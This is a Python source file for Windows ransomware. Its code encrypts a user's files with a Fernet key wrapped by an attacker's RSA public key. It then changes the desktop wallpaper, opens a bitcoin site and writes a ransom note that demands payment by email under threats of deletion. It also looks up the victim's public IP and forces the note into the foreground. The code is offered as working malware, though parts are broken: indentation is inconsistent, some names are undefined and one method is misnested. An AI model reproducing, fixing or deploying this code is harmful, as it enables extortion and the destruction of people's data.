#!/usr/bin/env python3
#libraries
from cryptography.fernet import Fernet
import os # to get system root
import webbrowser # to load webbrowser to go to specific webiste eg bitcoin
import ctypes # so we can interact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get request to api.ipify.org to get target machine ip addr 
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # could be used to give a time limit on the ransom note
import subprocess # to open up notepad and the ransom note file as a process
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64 
import threading # used for ransom note and decryption key on desktop 


class RansomWare:

	#File extensions to seek out and encrypt
	file_exts = [
    	'txt',
    	#We comment out 'jpg' so that we can see the RansomWare only encrypts specific files that we have chosen-
    	# -and leaves other files un-encrypted etc.
    	# 'jpg',
    ]

    def __init__(self):
    	#key that will be used for Fernet object and encrypt/decrypt method
    	self.key = None
    	#Encrypt/Decrypter
    	self.crypter = None
    	#RSA public key used for encrypting/decrypting fernet object eg, Symetric key
    	self.public_key = None

    	''' Root directories to start Encryption/Decryption from
    		CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
    		CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
    		CAUTION: eg, use 'localRoot' and create some folder directory and files in the folders etc.
    	'''

    	# Use sysroot to create absolute path for files etc for encrypting whole system
    	self.sysRoot = os.path.expanduser('~')
    	# Use localroot to test encryption software and for absolute path for files and encryption of the "test system"
    	self.localRoot = r'D:\Coding\Python\RansomWare_Software\localRoot' # Debugging/Testing

    	# Get public IP of person, for more analysis etc. (Check if you have hit gov, military, ip space)
    	self.publicIP = requests.get('https://api.ipify.org').text

    # Generates [SYMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
    	# Generates a url safe(base64 encoded) key
    	self.key = Fernet.generate_key()
    	# Creates a fernet object with encrypt/decrypt methods
    	self.crypter = Fernet(self.key)

    def write_key(self):
    	with open('fernet_key.txt', 'wb') as f:
    		f.write(self.key)


    # Encrypt [SYMETRIC KEY] that was created on the victim machine to Encrypt/Decrypt files with our PUBLIC ASYMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can Decrypt files etc.
    def encrypt_fernet_key(self):
    	with open('fernet_key.txt', 'rb') as fk:
    		fernet_key = fk.read()	
    	with open('fernet_key.txt', 'wb') as f:
    		# Public RSA key
    		self.public_key = RSA.import_key(open('public.pem').read())
    		# Public encrypter object
    		public_crypter = PKCS1_OAEP.new(self.public_key)
    		# Encrypted fernet key
    		encrypt_fernet_key = public_crypter.encrypt(fernet_key)
    		# Write encrypted ferent key to file
    		f.write(encrypt_fernet_key)
    	# Write encrypted fernet key to desktop as well so they can send this file to be unencrypted and get system files back
    	with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
    		fa.write(enc_fernet_key)
    	# Assign self.key to encrypted fernet key
    	self.key = encrypt_fernet_key
    	# Remove fernet crypter object
    	self.crypter = None

    # [SYMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
    	with open(file_path, 'rb') as f:
    		# Read data from file
    		data = f.read()
    		if not encrypted:
    			# Print file contents - [debugging]
    			print(data)
    			# Encrypt data from file
    			_data = self.crypter.encrypt(data)
    			# Log file encrypted and print encrypted contents - [debugging]
    			print('> File encrypted')
    			print(_data)
    		else:
    			# Decrypt data from file
    			_data = self.crypter.decrypt(data)
    			# Log file decrypted and print decrypted contents - [debugging]
    			print('> File decrypted')
    			print(_data)
    	with open(file_path, 'wb') as fp:
    		# Write encrypted data to file using same filename to overwrite original file
    		fp.write(_data)


    # [SYMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
    	system = os.walk(self.localRoot, topdown=True)
    	for root, dir, files in system:
    		for file in files:
    			file_path = os.path.join(root, file)
    			if not file.split('.')[-1] in self.file.exts:
    				continue
    			if not encrypted:
    				self.crypt_file(file_path)
    			else:
    				self.crypt_file(file_path, encrypted=True)

    @staticmethod
    def what_is_bitcoin():
    	url = 'https://bitcoin.org'
    	# Open browser to the https://bitcoing.org so they know what bitcoin is
    	webbrowser.open(url)

    def change_desktop_background(self):
    	imageUrl = 'Add this in bro'  # Add this to what you want bro!!!!!
    	# Go to specific URL and download+save image using absolute path
    	path = f'{self.sysRoot}Desktop/background.jpg'
    	urllib.request.urlretrieve(imageUrl, path)
    	SPI_SETDESKWALLPAPER = 20
    	# Access Windows dlls for functionality eg, changing desktop wallpaper
    	ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
    	date = datetime.date.today().strftime('%d-%B-Y')
    	with open('fernet_key.txt', 'rb') as fp:
    		self.key = fp.read()
    	with open('RANSOM_NOTE.txt', 'w') as f:
    		f.write(f'''
The hardisks of your computer have been encrypted with a modern grade encryption algorithm
There is no way to restore your data without a special key.
Only we can decrypt your files!

To purchase your key and restore your data, please follow these three easy steps:

1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to blackwaterbardwell@protonmail.com)

2. You will recieve your personal BTC address for the payment.
	Once the payment has been completed, send another email to blackwaterbardwell@protonmail.com stating "PAID".
	We will check to see if payment has been made.

3. You will receive a text file with your KEY that will unlock all your files.

WARNING:
Do NOT attempt to decrypt your file with any software as it is obselete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance yuou will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL!
''')

   def show_ransom_note(self):
   	# Open the ransom note
   	ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
   	count = 0 # Debugging/Testing
   	while True:
   		time.sleep(0.1)
   		top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
   		if top_window == 'RANSOM_NOTE - Notepad':
   			print('Ransom note is the top window - do nothing') # Debugging/Testing
   			pass
   		else:
   			print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
   			# Kill ransom note so we can open it again and make sure ransom note is in Foreground (top of all windows)
   			time.sleep(0.1)
   			ransom.kill()
   			# Open the ransom note
   			time.sleep(0.1)
   			ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
   		# Sleep for 10 seconds
   		time.sleep(10)
   		count +=1
   		if count == 5:
   			break

   	# Decrypts system when text file with un-encrypted key is placed on desktop of target machine
   	def put_me_on_desktop(self):
   		# Loop to check file and if file will read key and then self.key + self.cryptor will be valid for decrypting-
   		# -the files
   		print('started') # Debugging/Testing
   		while True:
   			try:
   				print('trying') # Debuging/Testing
   				# The Attacker decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
   				# -key in this file and sends it in an email to the victime. They then put this on the desktop and it will be-
   				# -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYMETRIC KEY etc.
   				with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
   					self.key = f.read()
   					self.crypter = Fernet(self.key)
   					# Decrypt system once fiel is found and we have crypter with correct key
   					self.crypt_system(encrypted=True)
   					print('decrypted') # Debugging/Testing
   					break
   			except Exception as e:
   				print(e) # Debugging/Testing
   				pass
   			time.sleep(10) # Debugging/Testing check for file on desktop every 10 seconds
   			print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
   			# Would use below code in real life etc... above 10secs is just to "show" concept
   			# Sleep ~ 3 mins
   			# secs = 60
   			# min = 3
   			# time.sleep((mins*secs))


def main():
	#testfile = r'D:\Coding\Python\RansomWare\Ransomware_Software\testfile.png'
   	rw = RansomWare()
   	rw.generate_key()
   	rw.crypt_system()
   	rw.write_key()
   	rw.encrypt_fernet_key()
   	rw.change_desktop_background()
   	rw.what_is_bitcoin()
   	rw.ransom_note()

   	t1 = threading.Thread(target=rw.show_ransom_note)
   	t2 = threading.Thread(target=rw.put_me_on_desktop)

   	t1.start()
   	print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
   	print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
   	t2.start()
   	print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
   	print('> RansomeWare: Completed') # Debugging/Testing


if __name__ == '__main__':
	main()

